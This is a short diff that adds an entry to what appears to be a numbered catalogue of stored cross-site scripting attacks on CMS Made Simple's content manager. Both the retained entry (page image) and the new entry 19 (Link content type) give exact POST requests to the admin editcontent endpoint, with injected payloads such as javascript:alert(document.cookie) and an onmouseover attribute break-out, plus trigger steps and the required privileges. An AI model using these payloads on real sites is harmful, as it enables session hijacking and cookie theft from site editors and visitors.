@@ -89,3 +89,8 @@
 - Set: `POST .../moduleinterface.php?mact=CMSContentManager,m1_,admin_editcontent,0&__c=KEY` → `m1_content_id=<page>&image=x" onerror="alert(document.cookie)&m1_submit=1`
 - Fire: visit any frontend page whose template uses `{page_image tag=1}` (auto-fires)
 - Req: content editor; template outputs page image or an `extra` field.
+
+**19. Link content type — stored XSS via URL (javascript: / attribute)**
+- Set: `POST .../moduleinterface.php?mact=CMSContentManager,m1_,admin_editcontent,0&__c=KEY` → `m1_content_type=link&title=Evil&url=javascript:alert(document.cookie)&m1_submit=1`
+- Fire: click that entry in the site menu (or use `url=x" onmouseover="alert(1)`)
+- Req: "Add Pages"; the Link page appears in a rendered menu.
